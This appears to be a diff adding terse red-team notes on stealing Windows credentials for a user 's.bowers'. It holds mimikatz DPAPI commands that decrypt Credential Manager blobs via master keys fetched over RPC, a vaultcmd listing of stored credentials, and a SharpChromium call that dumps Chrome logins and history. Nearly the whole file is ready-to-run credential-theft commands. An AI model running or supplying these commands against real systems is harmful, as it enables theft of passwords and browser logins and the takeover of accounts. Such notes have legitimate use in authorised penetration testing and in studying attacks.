@@ -1,0 +1,25 @@
+Credential Manager
+mimikatz: sekurlsa :: dpapi 
+
+SharpShell return Host.GetHostname();
+
+ShellCmd vaultcmd /listcreds:"Windows Credentials" /all
+
+ls C:\Users\s.bowers\AppData\Local\Microsoft\Credentials
+ 
+mimikatz "dpapi::cred /in:C:\Users\s.bowers\AppData\Local\Microsoft\Credentials\5DD604C1E108746934B92E2A20318758"
+mimikatz "dpapi::masterkey /in:C:\Users\s.bowers\AppData\Roaming\Microsoft\Protect\S-1-5-21-3865823697-1816233505-1834004910-1132\fcf4f725-0947-4180-a924-bc9da9ed8910 /rpc"
+ 
+now we need guidMasterKey - pbData
+
+guidMasterKey
+"dpapi::masterkey /in:C:\Users\s.bowers\AppData\Roaming\Microsoft\Protect\S-1-5-21-3865823697-1816233505-1834004910-1132\fcf4f725-0947-4180-a924-bc9da9ed8910 /rpc"
+
+"dpapi::cred /in:C:\Users\s.bowers\AppData\Local\Microsoft\Credentials\5DD604C1E108746934B92E2A20318758 /masterkey:REDACTED"
+
+---------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------
+Google Chrome
+Assembly /assemblyname:"SharpChromium" /parameters:"history logins"
+
+
